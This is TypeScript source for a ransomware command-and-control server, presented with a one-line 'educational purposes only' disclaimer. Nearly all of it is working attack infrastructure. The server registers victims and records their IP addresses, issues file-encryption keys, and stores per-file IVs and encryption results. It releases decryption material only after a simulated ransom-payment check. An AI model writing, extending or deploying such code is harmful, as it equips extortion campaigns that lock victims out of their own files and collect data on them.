// Ransomware Command & Control Server
// For educational purposes only

import net from 'net'
import crypto from 'crypto'
import fs from 'fs'
import path from 'path'
import { generateRSAKeys, encryptRSA, decryptRSA } from './rsaComm'
import {
    MessageType,
    ServerMessage,
    VictimInfo,
    SERVER_CONFIG,
    PaymentStatus
} from './types/communication'

// In-memory storage of victim information
// In a real malicious scenario, this would be stored in a database
const victims = new Map<string, VictimInfo>()

// Create server instance
const server = net.createServer()

// Ensure results directory exists
if (!fs.existsSync(SERVER_CONFIG.RESULTS_DIR)) {
    fs.mkdirSync(SERVER_CONFIG.RESULTS_DIR, { recursive: true })
}

// Generate a unique ID for the victim
function generateVictimId(): string {
    return crypto.randomBytes(8).toString('hex')
}

// Handle client connection
server.on('connection', (socket) => {
    const clientAddress = `${socket.remoteAddress}:${socket.remotePort}`
    let currentVictimId: string | null = null

    console.log(`[+] Client connected: ${clientAddress}`)

    // Handle data from clients
    socket.on('data', (data) => {
        try {
            // Parse the JSON message from client
            const message = JSON.parse(data.toString()) as ServerMessage
            console.log(`[+] Received ${message.type} from ${clientAddress}`)

            let response: ServerMessage

            // Handle different message types
            switch (message.type) {
                case MessageType.INITIALIZE:
                    if (message.victimId) {
                        // Client is trying to reconnect with an existing ID
                        response = handleReconnect(
                            message.victimId,
                            clientAddress
                        )
                    } else {
                        // New client, generate new victim ID
                        response = handleInitialize(clientAddress)
                    }
                    currentVictimId = response.victimId || null
                    break

                case MessageType.STORE_IV:
                    if (!currentVictimId || !message.filePath || !message.iv) {
                        response = {
                            type: 'ERROR',
                            message: 'Missing victim ID, filePath or IV'
                        }
                    } else {
                        response = handleStoreIV(
                            currentVictimId,
                            message.filePath,
                            Buffer.from(message.iv, 'base64')
                        )
                    }
                    break

                case MessageType.ENCRYPT_KEY:
                    if (!currentVictimId) {
                        response = {
                            type: 'ERROR',
                            message: 'Missing victim ID'
                        }
                    } else {
                        response = handleEncryptKey(currentVictimId)
                    }
                    break

                case MessageType.PAYMENT_VERIFICATION:
                    if (!message.victimId || !message.message) {
                        // message contains transaction ID
                        response = {
                            type: 'ERROR',
                            message:
                                'Missing victim ID or transaction information'
                        }
                    } else {
                        response = handlePaymentVerification(
                            message.victimId,
                            message.message // transaction ID
                        )
                    }
                    break

                case MessageType.DECRYPT_REQUEST:
                    if (!message.victimId) {
                        response = {
                            type: 'ERROR',
                            message: 'Missing victim ID'
                        }
                    } else {
                        response = handleDecryptRequest(message.victimId)
                    }
                    break

                case MessageType.STORE_ENCRYPTION_RESULTS:
                    if (
                        !currentVictimId ||
                        !message.encryptionResults ||
                        !message.targetDirectory
                    ) {
                        response = {
                            type: 'ERROR',
                            message:
                                'Missing victim ID, encryption results, or target directory'
                        }
                    } else {
                        response = handleStoreEncryptionResults(
                            currentVictimId,
                            message.encryptionResults,
                            message.targetDirectory
                        )
                    }
                    break

                case MessageType.LOAD_ENCRYPTION_RESULTS:
                    if (!message.victimId) {
                        response = {
                            type: 'ERROR',
                            message: 'Missing victim ID'
                        }
                    } else {
                        response = handleLoadEncryptionResults(message.victimId)
                    }
                    break

                default:
                    response = {
                        type: 'ERROR',
                        message: 'Unknown message type'
                    }
            }

            // Send response back to client
            socket.write(JSON.stringify(response))
            console.log(
                `[+] Sent ${response.type} response to ${clientAddress}`
            )
        } catch (error) {
            console.error(
                `[-] Error processing message from ${clientAddress}:`,
                error
            )
            socket.write(
                JSON.stringify({
                    type: 'ERROR',
                    message: 'Failed to process request'
                })
            )
        }
    })

    // Handle client disconnection
    socket.on('end', () => {
        console.log(`[+] Client disconnected: ${clientAddress}`)
    })

    // Handle errors
    socket.on('error', (err) => {
        console.error(`[-] Socket error from ${clientAddress}:`, err)
    })
})

// Handle reconnection from existing client
function handleReconnect(victimId: string, ipAddress: string): ServerMessage {
    const victim = victims.get(victimId)

    // Check if victim exists
    if (!victim) {
        console.log(
            `[-] Failed reconnection attempt with unknown victim ID: ${victimId}`
        )
        // Create a new victim instead
        return handleInitialize(ipAddress)
    }

    // Update IP address (might have changed)
    victim.ipAddress = ipAddress
    console.log(`[+] Victim reconnected: ${victimId} from ${ipAddress}`)

    // Return the existing victim information
    return {
        type: 'INITIALIZE_RESPONSE',
        victimId: victim.victimId,
        publicKey: victim.publicKey,
        aesKey: victim.aesKey.toString('base64')
    }
}

// Handle initialization request - generate a new victim ID and keys
function handleInitialize(ipAddress: string): ServerMessage {
    // Generate victim ID
    const victimId = generateVictimId()

    // Generate AES key for file encryption
    const aesKey = crypto.randomBytes(32)

    // Generate RSA key pair for secure communication
    const { publicKey, privateKey } = generateRSAKeys() // Store victim information
    victims.set(victimId, {
        victimId,
        aesKey,
        encryptedAESKey: Buffer.alloc(0), // Will be set later
        publicKey,
        privateKey,
        infected: new Date(),
        ipAddress,
        paymentStatus: 'pending',
        ivMap: new Map<string, Buffer>()
    })

    console.log(`[+] Initialized new victim: ${victimId}`)
    logVictimStatus()

    // Save victim initialization entry
    saveVictimResults(victimId, {
        action: 'INITIALIZE',
        timestamp: new Date().toISOString(),
        ipAddress,
        aesKeyLength: aesKey.length,
        publicKeyLength: publicKey.length
    })

    // Return the victim ID and public key to the client
    return {
        type: 'INITIALIZE_RESPONSE',
        victimId,
        publicKey,
        aesKey: aesKey.toString('base64')
    }
}

// Handle storing IVs for encrypted files
function handleStoreIV(
    victimId: string,
    filePath: string,
    iv: Buffer
): ServerMessage {
    const victim = victims.get(victimId)

    if (!victim) {
        return {
            type: 'ERROR',
            message: 'Victim ID not found'
        }
    } // Store the IV for this file
    victim.ivMap.set(filePath, iv)

    console.log(`[+] Stored IV for file: ${filePath} (Victim: ${victimId})`)

    // Save IV storage entry
    saveVictimResults(victimId, {
        action: 'STORE_IV',
        timestamp: new Date().toISOString(),
        filePath,
        totalFiles: victim.ivMap.size
    })

    return {
        type: 'STORE_IV_RESPONSE',
        success: true
    }
}

// Handle encrypting the AES key with the attacker's public key
function handleEncryptKey(victimId: string): ServerMessage {
    const victim = victims.get(victimId)

    if (!victim) {
        return {
            type: 'ERROR',
            message: 'Victim ID not found'
        }
    } // Encrypt the AES key with the victim's public key
    // Convert AES key from Buffer to string for RSA encryption
    const aesKeyString = victim.aesKey.toString('hex')
    const encryptedAESKey = encryptRSA(aesKeyString, victim.publicKey)
    victim.encryptedAESKey = encryptedAESKey

    console.log(`[+] Encrypted AES key for victim: ${victimId}`)

    // Save key encryption entry
    saveVictimResults(victimId, {
        action: 'ENCRYPT_KEY',
        timestamp: new Date().toISOString(),
        success: true
    })

    return {
        type: 'ENCRYPT_KEY_RESPONSE',
        encryptedAESKey: encryptedAESKey.toString('base64'),
        success: true
    }
}

// Handle payment verification
function handlePaymentVerification(
    victimId: string,
    transactionId: string
): ServerMessage {
    const victim = victims.get(victimId)

    if (!victim) {
        return {
            type: 'ERROR',
            message: 'Victim ID not found'
        }
    } // Simulate payment verification (in a real scenario, this would check blockchain)
    // For this simulation, we assume any transaction ID is valid
    const isPaymentValid = transactionId.length > 8
    if (isPaymentValid) {
        victim.paymentStatus = 'paid'
        console.log(
            `[+] Payment verified for victim: ${victimId} (Transaction: ${transactionId})`
        )

        // Save payment verification entry
        saveVictimResults(victimId, {
            action: 'PAYMENT_VERIFICATION',
            timestamp: new Date().toISOString(),
            transactionId,
            paymentStatus: 'paid'
        })
    } else {
        console.log(
            `[-] Invalid payment for victim: ${victimId} (Transaction: ${transactionId})`
        )
    }

    return {
        type: 'PAYMENT_VERIFICATION_RESPONSE',
        success: isPaymentValid
    }
}

// Handle decryption request after payment
function handleDecryptRequest(victimId: string): ServerMessage {
    const victim = victims.get(victimId)

    if (!victim) {
        return {
            type: 'ERROR',
            message: 'Victim ID not found'
        }
    }

    // Check if payment has been made
    if (victim.paymentStatus !== 'paid') {
        return {
            type: 'DECRYPT_REQUEST_RESPONSE',
            success: false,
            message: 'Payment has not been verified'
        }
    } // Prepare IVs to send back to the client
    const ivMapObject: Record<string, string> = {}
    victim.ivMap.forEach((iv, filePath) => {
        ivMapObject[filePath] = iv.toString('base64')
    })

    console.log(`[+] Sending decryption keys for victim: ${victimId}`)

    // Save decryption request entry
    saveVictimResults(victimId, {
        action: 'DECRYPTION_REQUEST',
        timestamp: new Date().toISOString(),
        success: true,
        filesCount: victim.ivMap.size
    })

    // Send the private key and IVs back to the client
    return {
        type: 'DECRYPT_REQUEST_RESPONSE',
        success: true,
        privateKey: victim.privateKey,
        message: JSON.stringify(ivMapObject) // Send IVs as a JSON string
    }
}

// Handle storing encryption results on the server
function handleStoreEncryptionResults(
    victimId: string,
    encryptionResultsBase64: string,
    targetDirectory: string
): ServerMessage {
    const victim = victims.get(victimId)
    if (!victim) {
        return {
            type: 'ERROR',
            message: 'Victim not found'
        }
    }

    try {
        // Decode the encryption results
        const encryptionResultsBuffer = Buffer.from(
            encryptionResultsBase64,
            'base64'
        )
        const encryptionResults = JSON.parse(encryptionResultsBuffer.toString())

        // Store in victim data
        victim.encryptionResults = encryptionResults
        victim.targetDirectory = targetDirectory

        // Save to single file per victim with timestamp as entry
        saveVictimResults(victimId, {
            action: 'ENCRYPTION',
            timestamp: new Date().toISOString(),
            targetDirectory,
            encryptionResults
        })

        console.log(`[+] Stored encryption results for victim ${victimId}`)

        return {
            type: 'SUCCESS',
            success: true,
            message: 'Encryption results stored successfully'
        }
    } catch (error) {
        console.error(
            `[-] Failed to store encryption results for victim ${victimId}:`,
            error
        )
        return {
            type: 'ERROR',
            message: 'Failed to store encryption results'
        }
    }
}

// Handle loading encryption results from the server
function handleLoadEncryptionResults(victimId: string): ServerMessage {
    const victim = victims.get(victimId)
    if (!victim) {
        return {
            type: 'ERROR',
            message: 'Victim not found'
        }
    }

    try {
        // Try to load from memory first
        if (victim.encryptionResults) {
            console.log(
                `[+] Loading encryption results from memory for victim ${victimId}`
            )
            return {
                type: 'SUCCESS',
                success: true,
                encryptionResults: Buffer.from(
                    JSON.stringify(victim.encryptionResults)
                ).toString('base64')
            }
        }

        // Load from single victim file
        const resultsFilePath = path.join(
            SERVER_CONFIG.RESULTS_DIR,
            `${victimId}.json`
        )
        if (fs.existsSync(resultsFilePath)) {
            const fileContent = fs.readFileSync(resultsFilePath, 'utf8')
            const victimData = JSON.parse(fileContent)

            // Find the latest encryption results
            const encryptionEntries = victimData.entries.filter(
                (entry: any) => entry.action === 'ENCRYPTION'
            )
            if (encryptionEntries.length > 0) {
                const latestEntry =
                    encryptionEntries[encryptionEntries.length - 1]

                // Update victim data
                victim.encryptionResults = latestEntry.encryptionResults
                victim.targetDirectory = latestEntry.targetDirectory

                console.log(
                    `[+] Loaded encryption results from file for victim ${victimId}`
                )
                return {
                    type: 'SUCCESS',
                    success: true,
                    encryptionResults: Buffer.from(
                        JSON.stringify(latestEntry.encryptionResults)
                    ).toString('base64')
                }
            }
        }

        return {
            type: 'ERROR',
            message: 'No encryption results found for this victim'
        }
    } catch (error) {
        console.error(
            `[-] Failed to load encryption results for victim ${victimId}:`,
            error
        )
        return {
            type: 'ERROR',
            message: 'Failed to load encryption results'
        }
    }
}

// Log current victim status
function logVictimStatus(): void {
    console.log('\n=== Current Victims ===')
    console.log(`Total victims: ${victims.size}`)

    victims.forEach((victim, victimId) => {
        console.log(`\nVictim ID: ${victimId}`)
        console.log(`IP Address: ${victim.ipAddress}`)
        console.log(`Infected: ${victim.infected.toISOString()}`)
        console.log(`Payment Status: ${victim.paymentStatus}`)
        console.log(`Encrypted Files: ${victim.ivMap.size}`)

        // Save victim data to file
        saveVictimData(victimId)
    })
    console.log('\n')
}

// Save victim data entry to a single file per victim with timestamps as entries
function saveVictimResults(victimId: string, entry: any): void {
    const victim = victims.get(victimId)
    if (!victim) return

    try {
        const resultsFilePath = path.join(
            SERVER_CONFIG.RESULTS_DIR,
            `${victimId}.json`
        )

        let victimData: any = {
            victimId,
            ipAddress: victim.ipAddress,
            infected: victim.infected.toISOString(),
            entries: []
        }

        // Load existing data if file exists
        if (fs.existsSync(resultsFilePath)) {
            const existingContent = fs.readFileSync(resultsFilePath, 'utf8')
            victimData = JSON.parse(existingContent)
        }

        // Add new entry with timestamp
        victimData.entries.push(entry)

        // Update metadata
        victimData.lastUpdated = new Date().toISOString()
        victimData.paymentStatus = victim.paymentStatus
        victimData.encryptedFilesCount = victim.ivMap.size

        // Write updated data to file
        fs.writeFileSync(resultsFilePath, JSON.stringify(victimData, null, 2))
        console.log(`[+] Saved victim entry to: ${resultsFilePath}`)
    } catch (error) {
        console.error(`[-] Failed to save victim results: ${error}`)
    }
}

// Save victim data to a single file per victim (updated approach)
function saveVictimData(victimId: string): void {
    const victim = victims.get(victimId)
    if (!victim) return

    try {
        // Convert the victim data to a serializable entry
        const victimEntry = {
            action: 'VICTIM_UPDATE',
            timestamp: new Date().toISOString(),
            paymentStatus: victim.paymentStatus,
            encryptedFilesCount: victim.ivMap.size,
            // Convert Map to object for JSON serialization
            ivMap: Array.from(victim.ivMap.entries()).reduce(
                (obj, [key, value]) => {
                    obj[key] = value.toString('base64')
                    return obj
                },
                {} as Record<string, string>
            ),
            // Convert Buffer to base64 for JSON serialization
            aesKey: victim.aesKey.toString('base64'),
            encryptedAESKey: victim.encryptedAESKey.toString('base64'),
            publicKey: victim.publicKey,
            privateKey: victim.privateKey
        }

        // Use the unified saving approach
        saveVictimResults(victimId, victimEntry)
    } catch (error) {
        console.error(`[-] Failed to save victim data: ${error}`)
    }
}

// Ensure results directory exists
if (!fs.existsSync(SERVER_CONFIG.RESULTS_DIR)) {
    try {
        fs.mkdirSync(SERVER_CONFIG.RESULTS_DIR, { recursive: true })
        console.log(
            `[+] Created results directory: ${SERVER_CONFIG.RESULTS_DIR}`
        )
    } catch (error) {
        console.error(`[-] Failed to create results directory: ${error}`)
    }
}

// Start the server
server.listen(SERVER_CONFIG.PORT, SERVER_CONFIG.HOST, () => {
    console.log(
        `[+] C2 Server running on ${SERVER_CONFIG.HOST}:${SERVER_CONFIG.PORT}`
    )
    console.log('[+] Waiting for victim connections...')
})

// Handle errors
server.on('error', (err) => {
    console.error('[-] Server error:', err)
})

// Handle server shutdown
process.on('SIGINT', () => {
    console.log('\n[+] Shutting down server...')
    server.close(() => {
        console.log('[+] Server shut down successfully')
        process.exit(0)
    })
})
